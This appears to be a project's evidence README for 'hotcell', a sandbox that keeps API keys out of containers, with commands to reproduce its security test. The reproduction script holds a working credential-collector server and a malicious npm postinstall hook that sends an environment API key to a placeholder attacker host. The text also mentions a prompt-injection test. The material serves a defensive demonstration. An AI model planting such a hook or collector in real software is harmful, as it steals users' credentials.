# Evidence — reproduce the attack yourself

Everything in the launch is reproduced here from raw machine output. A hostile
reader should be able to re-run this on a fresh box and get the same result. If
you get a *different* result, that's a bug report we want.

## The setup (three machines, all real)

| Role | What | Notes |
|---|---|---|
| **hotcell host** | Linux box (GCP `e2-standard-2`) running `hotcelld` with `HOTCELL_EGRESS_ENFORCE=true` and a real OpenRouter key **on the daemon** | the key is never in a sandbox |
| **attacker** | a *separate* VM running a tiny HTTP collector on :8080 that logs any credential it receives | a machine that isn't yours |
| **your Mac** | (macOS cell only) the Apple VZ microVM driver | proves the no-NIC claim |

The stolen key shown on the "bare Docker" side is a **canary**:
`sk-or-v1-CANARY0000LIVEKEY0000deadbeefcafe` — shaped like a real OpenRouter key,
deliberately fake. We never exfiltrate a live key on camera.

## The matrix (2 vectors × 2 legs, + macOS)

| | Bare Docker (today's default) | hotcell |
|---|---|---|
| **Malicious npm dependency** | KEY LEAKED (collector count 1) | 0 captured (token, not key; egress blocked) |
| **Prompt injection** | (moot — model declined) | model declined the injection |
| **macOS microVM** | — | exfil impossible: guest has no network interface |

- `vector2-dependency/raw-run.txt` — the deterministic control: a package's
  postinstall reads the env and POSTs to the attacker. Bare Docker leaks the
  canary; hotcell captures nothing.
- `vector1-injection/raw-run.txt` — the prompt-injection vector and its honest
  result (the model we tested declined it).
- `macos-vz/raw-run.txt` — `ip link` inside the microVM guest shows only `lo`;
  the exfil fails with "Network unreachable"; a real LLM call still succeeds over
  vsock.

## Reproduce it

Prereqs: a Linux host with Docker + Node ≥22, and a second host for the collector.

```bash
# 1. attacker collector (second host)
python3 - <<'PY' &   # logs anything with a key/token to stdout; GET /_captured for JSON
import http.server,socketserver,urllib.parse,json
C=[]
class H(http.server.BaseHTTPRequestHandler):
  def log_message(self,*a):pass
  def do_GET(self):
    p=urllib.parse.urlparse(self.path)
    if p.path=="/_captured": b=json.dumps({"count":len(C),"items":C}).encode()
    elif p.path=="/_reset": C.clear(); b=b"ok"
    else:
      q=urllib.parse.parse_qs(p.query); k=(q.get("key") or q.get("k") or q.get("token") or [""])[0]
      if k: C.append(k)
      b=b"ok"
    self.send_response(200); self.end_headers(); self.wfile.write(b)
socketserver.TCPServer(("0.0.0.0",8080),H).serve_forever()
PY

# 2. hotcell host
npm install -g hotcell
export HOTCELL_PROVIDER_KEY_OPENROUTER=sk-or-...     # your real key, on the daemon
HOTCELL_EGRESS_ENFORCE=true sudo -E hotcelld &        # root: installs the iptables default-deny

# 3. bare-Docker leg (the baseline): the key is in the env, a dep exfiltrates it
docker run --rm -e OPENROUTER_API_KEY=sk-or-v1-CANARY... node:22-slim bash -c '
  mkdir -p /tmp/p && echo "{\"name\":\"x\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node -e \\\"require(\x27http\x27).get(\x27http://<ATTACKER>:8080/pkg?key=\x27+process.env.OPENROUTER_API_KEY)\\\"\"}}" > /tmp/p/package.json
  cd /tmp && npm install ./p'
curl http://<ATTACKER>:8080/_captured        # -> count 1, the canary

# 4. hotcell leg: same attack, egress-enforced
curl http://<ATTACKER>:8080/_reset
SB=$(hotcell create --image node:22-slim --egress)
hotcell exec $SB 'echo $OPENROUTER_API_KEY'   # -> hc-... (a token, not your key)
hotcell exec $SB '<same npm install as above>'
curl http://<ATTACKER>:8080/_captured        # -> count 0
```

Note: on native Linux the daemon binds the egress gateway on `0.0.0.0` (so
sandboxes can reach it) — block that port at your cloud firewall; it is
token-gated. This whole story requires Linux + a privileged daemon for the
iptables default-deny. On macOS the answer is the microVM driver (see
`macos-vz/`), where the guest has no network device at all.
